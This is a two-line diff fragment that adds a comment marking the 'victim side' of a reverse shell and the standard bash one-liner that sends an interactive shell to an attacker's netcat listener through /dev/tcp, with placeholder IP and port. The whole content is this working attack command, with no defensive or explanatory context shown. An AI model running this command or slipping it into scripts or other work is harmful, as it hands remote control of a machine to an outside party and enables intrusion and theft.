@@ -1,0 +1,2 @@
+# Victim side: reverse shell to attacker's listener (running netcat)
+bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1
